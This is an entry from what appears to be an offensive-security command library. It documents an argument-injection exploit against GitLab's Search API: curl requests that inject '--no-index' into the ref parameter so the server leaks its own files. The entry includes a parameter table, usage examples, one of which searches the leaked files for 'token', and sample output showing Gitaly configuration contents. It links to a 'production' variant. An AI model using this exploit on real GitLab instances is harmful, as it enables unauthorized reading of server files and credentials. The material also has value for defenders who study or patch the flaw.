---
id: cmd-uuid-1
data: >-
  curl --header "PRIVATE-TOKEN: $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
tags:
  - api-request
  - injection
type: command
output: >-
  [{"basename":null,"data":"VERSION\\u00001\\u0000Gitaly, version
  1.53.2\\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4},{"basename":null,"data":"config.toml\\u00001\\u0000#
  Gitaly configuration
  file\\n...","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4}]
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.441Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-search-injection-local

## Command

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
```

## Description

Sends an authenticated HTTP request to GitLab's Search API, injecting --no-index into the ref parameter to trigger git grep on the server's current directory and leak file contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--header "PRIVATE-TOKEN: $TOKEN"` | Authentication header with API token | Yes (for private projects) |
| `projects/4` | Target project ID | Yes |
| `scope=blobs` | Search scope for blobs | Yes |
| `search=.` | Broad search pattern to match files | Yes |
| `ref=--no-index` | Injected Git flag to search outside repo | Yes |

## Examples

### Basic Usage

```bash
curl --header "PRIVATE-TOKEN: abc123" 'http://gitlab.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index'
```

### Advanced Usage

```bash
curl -s --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=token&ref=--no-index' | jq '.[].data'
```

## Expected Output

JSON array with escaped file data, e.g., contents from VERSION and config.toml indicating successful leak from /var/opt/gitlab/gitaly.

## Related

- [[commands/curl-gitlab-search-injection-production]]
- [[procedures/Inject-Git-Flag-in-GitLab-Search-API]]
